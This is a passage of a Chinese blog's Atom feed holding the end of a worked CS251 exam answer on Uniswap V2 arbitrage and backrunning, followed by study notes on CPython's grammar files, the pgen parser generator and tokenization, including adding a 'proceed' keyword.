ETH/DAI 池中添加 DAI 取出 ETH 来使得池中的 ETH 价格比例达到外部 ETH 价格，由于池中流动性乘积恒定，因此取出的 ETH 的套利利润即为流动性提供者的损失。</p><p><em>D)     现在让我们转向使用Uniswap V2 交易。假设Bob使用DAI/ETH池将DAI兑换成ETH进行大型 交易。交易完成后，DAI/ETH池中的DAI金额比之前略高，而ETH的金额则略低。因此，DAI/ETH  池中的资产比率有点偏离其平衡点。</em></p><p><em>套利者Alice发现了这个机会，并希望在反方向发行一个交易，以重新平衡资金池。她旨在从这笔交易中获利，所以希望确保她的交易在Bob交易后被立即执行。这种策略被称为“尾随”。</em></p><p><em>那么Alice如何能实施尾随计划呢？请提出可以使Alice的交易在Bob之后可以有合理机会被立即被执行的方法。</em></p><p><strong>答：</strong> Alice 可以利用一定量账户和一个合约来使得其交易在Bob交易之后被立即执行，具体步骤为：</p><ol><li>Alice 部署一个合约，这个合约可以提交交易，并预先存入用于交易的ETH；</li><li>准备一定数量的账户，账户中存入可用以支付gas的ETH；</li><li>Alice 监听以太坊的交易池，当监听到 Bob 的交易时，通过每一个账户调用部署的合约广播一个交易，这个交易的 gas 价格<strong>等于</strong> Bob 交易的 gas 价格。</li></ol><p>由于以太坊中矿工在打包交易时是根据交易的gas价格高低进行的，这样将会使得 Alice 广播的交易有机会处于 Bob 交易的后的第一个交易，从而达到获利机会。</p><p><em>E)      假设10个不同的套利者，为捕获Bob的交易创造的套利机会， 在同一时间执行了相同的尾随操作策略。他们都使用了你在(D)部分中所描述的相同机制，那么这10个中的哪一个会获胜呢？</em></p><p><strong>答：</strong> 由于以太坊中矿工在打包交易时是根据交易的 gas 价格高低进行的，因此对于所有 gas 价格和Bob的交易的 Gas 价格一致的交易，都有能被排序在Bob交易之后，所以这些交易中处在 Bob 交易之后的第一个交易将获利，对应的套利者获胜。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CS251 - final 2021 - 问题 3
    
    </summary>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CPython Internals 笔记 ── Python 语言和语法</title>
    <link href="https://qiwihui.com/qiwihui-blog-150/"/>
    <id>https://qiwihui.com/qiwihui-blog-150/</id>
    <published>2024-05-15T02:25:31.312Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>编译器的目的是将一种语言转换成另一种语言。把编译器想象成一个翻译器。比如你会雇一个翻译来听你说英语，然后翻译成日语。</p><p>为此，翻译人员必须了解源语言和目标语言的语法结构。</p><p>有些编译器会编译成低级机器码，可以直接在系统上执行。其他编译器会编译成一种中间语言，由虚拟机执行。</p><p>选择编译器时的一个考虑因素是系统可移植性要求。<a href="https://en.wikipedia.org/wiki/Java_bytecode">Java</a>和 <a href="https://en.wikipedia.org/wiki/Common_Language_Runtime">.NET CLR</a>将编译成一种中间语言，以便编译后的代码可以跨多个系统架构移植。C、Go、C++ 和 Pascal 将编译成可执行的二进制文件。此二进制文件是为编译它的平台构建的。</p><p>Python 应用程序通常作为源代码分发。Python 解释器的作用是将Python源代码进行转换并一步执行。CPython 运行时在第一次运行时会编译你的代码。这一步对普通用户是不可见的。</p><p>Python 代码不会被编译成机器码；它被编译成一种称为 <strong>字节码</strong> 的低级中间语言。此字节码存储在 <code>.pyc</code> 文件中并缓存以供执行。如果在不更改源代码的情况下两次运行同一个 Python 应用程序，则第二次执行速度会更快。这是因为它加载编译后的字节码而不是每次都重新编译。</p><span id="more"></span><h2><span id="wei-shi-me-cpython-shi-yong-c-er-bu-shi-yong-python-bian-xie">为什么 CPython 是用 C 而不是用 Python 编写</span></h2><p>CPython 中的 <strong>C</strong> 是对 C 编程语言的引用，这意味着这个 Python 发行版是用 C 语言编写的。</p><p>这种说法大多是正确的：CPython 中的编译器是用纯 C 编写的。但是，许多标准库模块是用纯 Python 或 C 和 Python 组合编写的。</p><p><strong>那么为什么 CPython 编译器是用 C 而不是 Python 编写的呢？</strong></p><p>答案在于编译器的工作方式。 有两种类型的编译器：</p><ol><li><p><a href="https://en.wikipedia.org/wiki/Self-hosting_(compilers)">自举编译器</a>是用它们编译的语言编写的编译器，例如 Go 编译器。这是通过称为引导的过程完成的。</p></li><li><p><a href="https://en.wikipedia.org/wiki/Source-to-source_compiler">源到源编译器</a>是用另一种已经有编译器的语言编写的编译器。</p></li></ol><p>如果你要从头开始编写新的编程语言，则需要一个可执行应用程序来编译你的编译器！你需要一个编译器来执行任何事情，所以当开发新语言时，它们通常首先用更老的、更成熟的语言编写。</p><p>还有一些可用的工具可以读取语言规范并创建解析器。流行的编译器-编译器（compiler-compilers）包括 GNU Bison、Yacc 和 ANTLR。</p><blockquote><p>如果你想了解有关解析器的更多信息，请查看 <a href="https://github.com/lark-parser/lark">lark</a> 项目。Lark 是一个用 Python 编写的上下文无关语法解析器。</p></blockquote><p>编译器引导的一个很好的例子是 Go 编程语言。第一个 Go 编译器是用 C 编写的，然后一旦 Go 可以编译了，就用 Go 重写编译器。</p><p>CPython 保留了 C 语言的传统；许多标准库模块，如 ssl 模块或套接字模块，都是用 C 编写的，用于访问低级操作系统 API。Windows 和 Linux 内核中用于<a href="https://realpython.com/python-sockets/">创建网络套接字</a>、<a href="https://realpython.com/working-with-files-in-python/">使用文件系统</a>或<a href="https://realpython.com/python-gui-with-wxpython/">与显示器交互</a>的 API 都是用 C 编写的。Python 的可扩展性层专注于 C 语言是有意义的。</p><p>有一个用 Python 编写的 Python 编译器，称为 PyPy。PyPy 的标志是一个 <a href="https://en.wikipedia.org/wiki/Ouroboros">衔尾蛇</a>，代表编译器的自举性质。</p><p>Python 交叉编译器的另一个示例是 Jython。Jython 是用 Java 编写的，从 Python 源代码编译成 Java 字节码。与 CPython 可以轻松导入 C 库并从 Python 中使用它们一样，Jython 可以轻松导入和引用 Java 模块和类。</p><p>创建编译器的第一步是定义语言。 例如，一下不是有效的 Python：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_example</span>() &lt;<span class="built_in">str</span>&gt; :</span><br><span class="line">&#123;</span><br><span class="line">    void* result = ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器在尝试执行之前需要严格的语言语法结构规则。</p><blockquote><p>对于本书的其余部分，<code>./python</code> 将指代 CPython 的编译版本。 但是，实际命令将取决于你的操作系统。</p><p>对于 Windows：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; python.exe</span><br></pre></td></tr></table></figure><p>对于 Linux：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ ./python</span><br></pre></td></tr></table></figure><p>对于 macOS：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ ./python.exe</span><br></pre></td></tr></table></figure></blockquote><h2><span id="python-yu-yan-gui-fan">Python 语言规范</span></h2><p>CPython 源代码中包含 Python 语言的定义。这个文档是所有 Python 解释器使用的参考规范。</p><p>该规范采用人类可读和机器可读的格式。文档里面是对 Python 语言的详细解释。包含允许的内容以及每个语句的行为方式。</p><h3><span id="yu-yan-wen-dang">语言文档</span></h3><p>位于 <code>Doc/reference</code> 目录中的是 Python 语言中每个功能的 <a href="http://docutils.sourceforge.net/rst.html">reStructured-Text</a> 解释。这些文件构成了 <a href="https://docs.python.org/3/reference/">docs.python.org/3/reference</a> 上的官方 Python 参考指南。</p><p>目录里面是你需要了解整个语言、结构和关键字的文件：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cpython/Doc/reference/</span><br><span class="line">├── compound_stmts.rst          复合语句，如 if、while、for 和函数定义</span><br><span class="line">├── datamodel.rst               对象、值和类型</span><br><span class="line">├── executionmodel.rst          Python程序的结构</span><br><span class="line">├── expressions.rst             Python 表达式的元素</span><br><span class="line">├── grammar.rst                 Python 的核心语法（参考 Grammar/Grammar）</span><br><span class="line">├── import.rst                  导入系统</span><br><span class="line">├── index.rst                   语言参考索引</span><br><span class="line">├── introduction.rst            参考文档介绍</span><br><span class="line">├── lexical_analysis.rst        词法结构，如行、缩进、标记和关键字</span><br><span class="line">├── simple_stmts.rst            简单的语句，如 assert、import、return 和 yield</span><br><span class="line">└── toplevel_components.rst     执行 Python 的方式的描述，如脚本和模块</span><br></pre></td></tr></table></figure><h3><span id="yi-ge-li-zi">一个例子</span></h3><p>在 <code>Doc/reference/compound_stmts.rst</code>，你可以看到一个定义 <code>with</code> 语句的简单示例。</p><p><code>with</code> 语句有多种形式，最简单的是上下文管理器的实例化和嵌套的代码块：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> x():</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>你可以使用 <code>as</code> 关键字将结果分配给变量：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> x() <span class="keyword">as</span> y:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>你还可以使用逗号将上下文管理器链接在一起：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> x() <span class="keyword">as</span> y, z() <span class="keyword">as</span> jk:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>文档包含语言的人类可读规范，机器可读规范包含在单个文件 <code>Grammar Grammar</code> 中。</p><h3><span id="yu-fa-wen-jian">语法文件</span></h3><blockquote><p>本节指的是“旧解析器”使用的语法文件。 在发布时，“新解析器”（PEG 解析器）是实验性的，尚未完成。</p><p>对于 3.8 及以下版本的 CPython，默认使用 pgen 解析器。对于 CPython 3.9 及更高版本，PEG 解析器是默认的。可以在命令行上使用 <code>-X oldparser</code> 启用旧解析器。</p><p>两个解析器都使用 <code>Tokens</code> 文件。</p></blockquote><p>语法文件以一种称为<a href="https://en.wikipedia.org/wiki/Backus%E2%80%93Naur_form">巴科斯范式</a> (BNF) 的上下文符号编写。巴科斯范式不是 Python 特有的，通常用作许多其他语言中的语法符号。</p><p>编程语言中语法结构的概念受到 <a href="https://en.wikipedia.org/wiki/Syntactic_Structures">Noam Chomsky 在 1950 年代关于句法结构的工作</a>的启发！</p><p>Python 的语法文件使用扩展巴科斯范式（EBNF）规范和正则表达式语法。因此，在语法文件中，你可以使用：</p><ul><li><code>*</code> 用于重复</li><li><code>+</code> 至少重复一次</li><li><code>[]</code> 用于可选部分</li><li><code>|</code> 对于替代品</li><li><code>()</code> 用于分组</li></ul><p>例如，考虑如何定义一杯咖啡：</p><ul><li>它必须有一个杯子</li><li>它必须包括至少一瓶浓缩咖啡（espresso），并且可以包含多个</li><li>它可以有牛奶，但可选</li><li>你可以在咖啡中加入多种牛奶，如全脂、脱脂和豆奶（soy）</li></ul><p>在 EBNF 中定义的咖啡订单可能如下所示：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">coffee: &#x27;cup&#x27; (&#x27;espresso&#x27;)+ [&#x27;water&#x27;] [milk]</span><br><span class="line">milk: &#x27;full-fat&#x27; | &#x27;skimmed&#x27; | &#x27;soy&#x27;</span><br></pre></td></tr></table></figure><p>在本章中，语法是用铁路图形象化的。 这张图是咖啡语句的铁路图：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769007-ecd75282-7d28-4d9f-9904-60cba7b83350.png" alt="coffee_statement"></p><p>在铁路图中，每个可能的组合必须从左到右排成一条线。 可选语句可以被绕过，有些语句可以形成循环。</p><p>如果在语法文件中搜索 <code>with_stmt</code>，可以看到定义：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">with_stmt: &#x27;with&#x27; with_item (&#x27;,&#x27; with_item)*  &#x27;:&#x27; suite</span><br><span class="line">with_item: test [&#x27;as&#x27; expr]</span><br></pre></td></tr></table></figure><p>引号中的任何内容都是字符串文字，称为终端（terminal）。终端是识别关键字的方式。<code>with_stmt</code> 指定为：</p><ol><li>从 <code>with</code> 开始</li><li>后面跟一个 <code>with_item</code>，它可以是 <code>test</code>，和（可选的） <code>as</code> 以及一个表达式 <code>expr</code></li><li>接着是一个或多个 <code>with_item</code>，每个都用逗号隔开</li><li>以 <code>:</code> 结尾</li><li>跟一个 <code>suite</code></li></ol><p>在这两行中引用了其他三个定义：</p><p>• <code>suite</code> 是指包含一个或多个语句的代码块• <code>test</code> 指的是一个被评估的简单的语句• <code>expr</code> 指的是一个简单的表达式</p><p>在铁路图中可视化，<code>with</code> 语句如下所示：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769199-d7db516f-fb2e-4a7d-ae4e-ca34f5c49d78.png" alt="with_stmt"></p><p>作为一个更复杂的例子，<code>try</code> 语句定义为：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">try_stmt: (&#x27;try&#x27; &#x27;:&#x27; suite</span><br><span class="line">           ((except_clause &#x27;:&#x27; suite)+</span><br><span class="line">            [&#x27;else&#x27; &#x27;:&#x27; suite]</span><br><span class="line">            [&#x27;finally&#x27; &#x27;:&#x27; suite] |</span><br><span class="line">           &#x27;finally&#x27; &#x27;:&#x27; suite))</span><br><span class="line">except_clause: &#x27;except&#x27; [test [&#x27;as&#x27; NAME]]</span><br></pre></td></tr></table></figure><p><code>try</code> 语句有两种用途：</p><ol><li><code>try</code> 和一个或多个 <code>except</code> 子句，然后是一个可选的 <code>else</code>，然后是一个可选的 <code>finally</code></li><li><code>try</code> 和只有一个 <code>finally</code> 语句</li></ol><p>或者，在铁路图中可视化：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769305-3fc27399-a211-48ae-92c9-780885c2ca03.png" alt="try_stmt"></p><p><code>try</code> 语句是更复杂结构的一个很好的例子。</p><p>如果你想详细了解 Python 语言，语法在 <code>Grammar/Grammar</code> 中定义。</p><h2><span id="shi-yong-jie-xi-qi-sheng-cheng-qi-the-parser-generator">使用解析器生成器（The Parser Generator）</span></h2><p>Python 编译器从不使用语法文件本身。相反，解析器表由解析器生成器创建。如果对语法文件进行更改，则必须重新生成解析器表并重新编译 CPython。</p><p>解析器表是潜在解析器状态的列表。当解析树变得复杂时，它们确保语法不会有歧义。</p><h2><span id="jie-xi-qi-sheng-cheng-qi">解析器生成器</span></h2><p>解析器生成器的工作原理是将 EBNF 语句转换为非确定性有限自动机 (Non-deterministic Finite Automaton，NFA)。NFA 状态和转换被解析并合并为一个确定性有限自动机 (Deterministic Finite Automaton，DFA)。</p><p>DFA 被解析器用作解析表。这种技术是<a href="http://infolab.stanford.edu/~ullman/dragon/slides1.pdf">在斯坦福大学形成的</a>，并在 1980 年代开发，就在 Python 出现之前。CPython 的解析器生成器 <code>pgen</code> 是 CPython 项目独有的。</p><p><code>pgen</code> 应用程序在 Python 3.8 中从 C 重写为 Python，在文件 <code>Parser/pgen/pgen.py</code> 中。</p><p>它可通过以下执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -m Parser.pgen [grammar] [tokens] [graminit.h] [graminit.c]</span><br></pre></td></tr></table></figure><p>它通常从构建脚本执行，而不是直接执行。</p><p>DFA 和 NFA 没有视觉输出，但有一个带有有向图输出的 <a href="https://github.com/tonybaloney/cpython/tree/dot_pgen">CPython 分支</a>。<code>decorator</code> 语法在 <code>Grammar/Grammar</code> 中定义为：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">decorator: &#x27;@&#x27; dotted_name [ &#x27;(&#x27; [arglist] &#x27;)&#x27; ] NEWLINE</span><br></pre></td></tr></table></figure><p>解析器生成器创建了一个包含 11 个状态的复杂 NFA 图。每个状态都用数字表示（在语法中提示它们的名称）。状态转移被称为“弧”。</p><p>DFA 比 NFA 更简单，路径减少了：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769383-4c305c61-39c4-4239-934e-5fadf0fc5281.png" alt="decorator_DFA"></p><p>NFA 和 DFA 图仅用于调试复杂语法的设计。</p><p>我们将使用铁路图代替 DFA 或 NFA 图来表示语法。例如，此图表示 <code>decorator</code> 语句可以采用的路径：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769434-73eb6a03-e7a1-4baa-bd65-e7b467b49ec9.png" alt="decorator_stmt"></p><h2><span id="chong-xin-sheng-cheng-yu-fa">重新生成语法</span></h2><p>要查看 <code>pgen</code> 的运行情况，让我们更改部分 Python 语法。在 <code>Grammar/Grammar</code> 中搜索 <code>pass_stmt</code> 以查看 <code>pass</code> 语句的定义：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pass_stmt: &#x27;pass&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/130769494-9b57251f-38fe-4d3b-b8eb-73e49c831eda.png" alt="pass_stmt"></p><p>通过添加选择 <code>|</code> 和 <code>proceed</code> 字面量，更改该行以接受终端（关键字）<code>'pass'</code> 或 <code>'proceed'</code> 作为关键字：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pass_stmt: &#x27;pass&#x27; | &#x27;proceed&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/130769525-5107b366-f299-4299-a31d-8573304203ec.png" alt="pass_stmt_modified"></p><p>接下来，通过运行 <code>pgen</code> 重建语法文件。CPython 带有脚本来自动化 <code>pgen</code>。</p><p>在 macOS 和 Linux 上，运行 <code>make regen-grammar</code>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$ make regen-grammar</span><br></pre></td></tr></table></figure><p>对于 Windows，从 PCBuild 目录调出命令行并使用 <code>--regen</code> 标志运行 <code>build.bat</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat --regen</span></span><br></pre></td></tr></table></figure><p>你应该会看到一个输出，显示新的 <code>Include/graminit.h</code> 和 <code>Python/graminit.c</code> 文件已重新生成。</p><p>使用重新生成的解析器表，当你重新编译 CPython 时，它将使用新语法。</p><p>如果代码编译成功，你可以执行新的 CPython 二进制文件并启动 REPL。</p><p>在 REPL 中，你现在可以尝试定义一个函数。不要使用 pass 语句，而是使用你编译到 Python 语法中的 <code>proceed</code> 关键字替代 <code>pass</code>：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -X oldparser</span><br><span class="line">Python 3.9.0b1 (tags/v3.9.0b1:97fe9cf, May 19 2020, 10:00:00)</span><br><span class="line">[Clang 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; def example():</span><br><span class="line">...    proceed</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; example()</span><br></pre></td></tr></table></figure><p>恭喜，你已经更改了 CPython 语法并编译了你自己的 CPython 版本。</p><p>接下来，我们将探索标记（tokens）及其与语法的关系。</p><h3><span id="biao-ji-tokens">标记（Tokens）</span></h3><p>除了 <code>Grammar</code> 文件夹中的语法文件之外，还有 <code>Grammar/Tokens</code> 文件，其中包含在分析树中作为叶节点找到的每个唯一类型。每个标记还有一个名称和一个生成的唯一 ID。名称用于使在分词器（tokenizer）中更容易引用。</p><blockquote><p><code>Grammar/Tokens</code> 文件是 Python 3.8 中的一项新功能。</p></blockquote><p>例如，左括号称为 <code>LPAR</code>，分号称为称为 <code>SEMI</code>。 你将在本书后面看到这些标记：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">LPAR                    &#x27;(&#x27;</span><br><span class="line">RPAR                    &#x27;)&#x27;</span><br><span class="line">LSQB                    &#x27;[&#x27;</span><br><span class="line">RSQB                    &#x27;]&#x27;</span><br><span class="line">COLON                   &#x27;:&#x27;</span><br><span class="line">COMMA                   &#x27;,&#x27;</span><br><span class="line">SEMI                    &#x27;;&#x27;</span><br></pre></td></tr></table></figure><p>和 <code>Grammar</code> 文件一样，如果你修改了 <code>Grammar/Tokens</code> 文件，你需要重新运行 <code>pgen</code>。</p><p>要查看操作中的标记，你可以使用 CPython 中的 <code>tokenize</code> 模块。</p><blockquote><p>CPython 源代码中有两个标记器。这里演示了一个用 Python 编写的分词器，另一个用 C 编写。用 Python 编写的分词器是一个实用程序，Python 解释器使用用 C 编写的那个。它们具有相同的输出和行为。用 C 编写的版本是为性能而设计的，而 Python 中的模块是为调试而设计的。</p></blockquote><p><code>cpython-book-samples/13/test_tokens.py</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Demo application</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_function</span>(): proceed</span><br></pre></td></tr></table></figure><p>将 <code>test_tokens.py</code> 文件输入到标准库中内置的名为 <code>tokenize</code> 的模块中。你将按行和字符看到标记列表。使用 <code>-e</code> 标志输出确切的标记名称：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -m tokenize -e test_tokens.py</span><br><span class="line"></span><br><span class="line">0,0-0,0:            ENCODING       <span class="string">&#x27;utf-8&#x27;</span>        </span><br><span class="line">1,0-1,18:           COMMENT        <span class="string">&#x27;# Demo application&#x27;</span></span><br><span class="line">1,18-1,19:          NL             <span class="string">&#x27;\n&#x27;</span>           </span><br><span class="line">2,0-2,3:            NAME           <span class="string">&#x27;def&#x27;</span>          </span><br><span class="line">2,4-2,15:           NAME           <span class="string">&#x27;my_function&#x27;</span>  </span><br><span class="line">2,15-2,16:          LPAR           <span class="string">&#x27;(&#x27;</span>            </span><br><span class="line">2,16-2,17:          RPAR           <span class="string">&#x27;)&#x27;</span>            </span><br><span class="line">2,17-2,18:          COLON          <span class="string">&#x27;:&#x27;</span>            </span><br><span class="line">2,18-2,19:          NEWLINE        <span class="string">&#x27;\n&#x27;</span>           </span><br><span class="line">3,0-3,4:            INDENT         <span class="string">&#x27;    &#x27;</span>         </span><br><span class="line">3,4-3,11:           NAME           <span class="string">&#x27;proceed&#x27;</span>      </span><br><span class="line">3,11-3,12:          NEWLINE        <span class="string">&#x27;\n&#x27;</span>           </span><br><span class="line">4,0-4,0:            DEDENT         <span class="string">&#x27;&#x27;</span>             </span><br><span class="line">4,0-4,0:            ENDMARKER      <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure><p>在输出中，第一列是行/列坐标的范围，第二列是标记的名称，最后一列是标记的值。</p><p>在输出中， <code>tokenize</code> 模块隐含了一些标记：</p><ul><li><code>utf-8</code> 的 <code>ENCODING</code> 标记</li><li>结尾的空白行</li><li><code>DEDENT</code> 关闭函数声明</li><li><code>ENDMARKER</code> 结束文件</li></ul><p>最佳做法是在 Python 源文件的末尾有一个空行。如果省略它，CPython 会为你添加它。</p><p><code>tokenize</code> 模块是用纯 Python 编写的，位于 <code>Lib/tokenize.py</code> 中。</p><p>要查看 C 分词器的详细读数，您可以使用 <code>-d</code> 标志运行 Python。使用之前创建的 <code>test_tokens.py</code> 脚本，使用以下命令运行它：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -d test_tokens.py</span><br><span class="line"></span><br><span class="line">Token NAME/<span class="string">&#x27;def&#x27;</span> ... It<span class="string">&#x27;s a keyword</span></span><br><span class="line"><span class="string"> DFA &#x27;</span>file_input<span class="string">&#x27;, state 0: Push &#x27;</span>stmt<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> DFA &#x27;</span>stmt<span class="string">&#x27;, state 0: Push &#x27;</span>compound_stmt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Token NEWLINE/&#x27;</span><span class="string">&#x27; ... It&#x27;</span>s a token we know</span><br><span class="line"> DFA <span class="string">&#x27;funcdef&#x27;</span>, state 5: [switch func_body_suite to suite] Push <span class="string">&#x27;suite&#x27;</span></span><br><span class="line"> DFA <span class="string">&#x27;suite&#x27;</span>, state 0: Shift.</span><br><span class="line">Token INDENT/<span class="string">&#x27;&#x27;</span> ... It<span class="string">&#x27;s a token we know</span></span><br><span class="line"><span class="string"> DFA &#x27;</span>suite<span class="string">&#x27;, state 1: Shift.</span></span><br><span class="line"><span class="string">Token NAME/&#x27;</span>proceed<span class="string">&#x27; ... It&#x27;</span>s a keyword</span><br><span class="line"> DFA <span class="string">&#x27;suite&#x27;</span>, state 3: Push <span class="string">&#x27;stmt&#x27;</span></span><br><span class="line">...</span><br><span class="line">ACCEPT.</span><br></pre></td></tr></table></figure><p>在输出中，你可以看到它突出显示了作为关键字的 <code>proceed</code>。在下一章中，我们将看到执行 Python 二进制文件是如何到达分词器的，以及从那里执行代码时会发生什么。</p><blockquote><p>要清理你的代码，请恢复 <code>Grammar/Grammar</code> 中的更改，再次重新生成语法，然后清理构建并重新编译：</p><p>对于 macOS 或 Linux：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -- Grammar/Grammar</span><br><span class="line">$ make regen-grammar</span><br><span class="line">$ make clobber</span><br><span class="line">$ make -j2 -s</span><br></pre></td></tr></table></figure><p>对于 Windows：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">git checkout -- Grammar/Grammar</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat --regen</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat -t CleanAll</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat -t Build</span></span><br></pre></td></tr></table></figure></blockquote><h2><span id="yi-ge-geng-fu-za-de-li-zi">一个更复杂的例子</span></h2><p>添加 <code>proceed</code> 作为 <code>pass</code> 的替代关键字是一个简单的更改，解析器生成器将 <code>'proceed'</code> 作为 <code>pass_stmt</code> 标记的文字进行匹配。这个新关键字无需对编译器进行任何更改即可工作。</p><p>在实践中，对语法的大多数更改都更加复杂。</p><p>Python 3.8 引入了赋值表达式，格式为 <code>:=</code>。赋值表达式既为名称赋值，又返回命名变量的值。受在 Python 语言中添加赋值表达式影响的语句之一是 <code>if</code> 语句。</p><p>在 3.8 之前，<code>if</code> 语句定义为：</p><ul><li>关键字 <code>if</code> 后跟 <code>test</code>，然后是 <code>:</code></li><li>嵌套的一系列语句（<code>suite</code>）</li><li>零个或多个 <code>elif</code> 语句，后跟 <code>test</code>、一个 <code>:</code> 和 <code>suite</code></li><li>一个可选的 <code>else</code> 语句，后跟一个 <code>:</code> 和一个 <code>suite</code></li></ul><p>在语法中，这表示为：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">if_stmt: &#x27;if&#x27; test &#x27;:&#x27; suite (&#x27;elif&#x27; test &#x27;:&#x27; suite)* [&#x27;else&#x27; &#x27;:&#x27; suite]</span><br></pre></td></tr></table></figure><p>可视化之后看起来像：</p><p>为了支持赋值表达式，更改需要向后兼容。 因此，在 <code>if</code> 语句中使用 <code>:=</code> 必须是可选的。</p><p><code>if</code> 语句中使用的 <code>test</code> 标记类型在许多语句之间是通用的。例如，<code>assert</code> 语句后跟一个 <code>test</code>（然后是可选的第二个 <code>test</code>）。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">assert_stmt: &#x27;assert&#x27; test [&#x27;,&#x27; test]</span><br></pre></td></tr></table></figure><p>在 3.8 中添加了替代 <code>test</code> 标记类型，以便语法可以规定哪些语句应该支持赋值表达式，哪些不应该支持。</p><p>这个称为 <code>namedexpr_test</code>，在 <code>Grammer</code> 中定义为：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">namedexpr_test: test [&#x27;:=&#x27; test]</span><br></pre></td></tr></table></figure><p>或者，在铁路图中可视化为：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769573-78634152-1b47-4ee8-9ca7-2f6b6e3ff4a1.png" alt="namedexpr_test"></p><p><code>if</code> 语句的新语法已更改为用 <code>namedexpr_test</code> 替换 <code>test</code>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">if_stmt: &#x27;if&#x27; namedexpr_test &#x27;:&#x27; suite (&#x27;elif&#x27; namedexpr_test &#x27;:&#x27; suite)</span><br><span class="line">        [&#x27;else&#x27; &#x27;:&#x27; suite]</span><br></pre></td></tr></table></figure><p>在铁路图中可视化：</p><p><img src="https://user-images.githubusercontent.com/3297411/130769666-b253d126-ab60-4eb5-8dd6-8e7ca3988282.png" alt="if_stmt_with_namedexpr_test"></p><p>为了区分 <code>:=</code> 和现有的 <code>COLON</code> (<code>:</code>) 和 <code>EQUAL</code> (<code>=</code>) 标记，将以下标记也添加到 <code>Grammar/Tokens</code> 中：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">COLONEQUAL              &#x27;:=&#x27;</span><br></pre></td></tr></table></figure><p>这不是支持赋值表达式所需的唯一更改。 如 <a href="https://github.com/python/cpython/pull/10497">Pull Request</a> 中所示，这一变化改变了 CPython 编译器的许多部分。</p><blockquote><p>有关 CPython 解析器生成器的更多信息，<code>pgen</code> 的作者在 PyCon Europe 2019 上录制了有关实现和设计的演示文稿：“<a href="https://www.youtube.com/watch?v=1_23AVsiQEc">野兽之魂</a>”。</p></blockquote><h2><span id="zong-jie">总结</span></h2><p>在本章中，你已经了解了 Python 语法定义和解析器生成器。在下一章中，你将扩展该知识以构建更复杂的语法功能，即“几乎等于”运算符。</p><p>在实践中，必须仔细考虑和讨论对 Python 语法的更改。审查水平有两个原因：</p><ol><li>拥有“太多”的语言特性或复杂的语法会改变 Python 作为一种简单易读的语言的精神</li><li>语法更改引入向后不兼容，这给所有开发人员增加了工作</li></ol><p>如果 Python 核心开发人员提议对语法进行更改，则必须将其作为 Python 增强提案 (PEP) 提出。所有 PEP 都在 PEP 索引上进行编号和索引。<a href="https://www.python.org/dev/peps/pep-0005/">PEP 5</a> 记录了语言发展的指南，并指定必须在 PEP 中提出更改。</p><p>成员还可以通过 <a 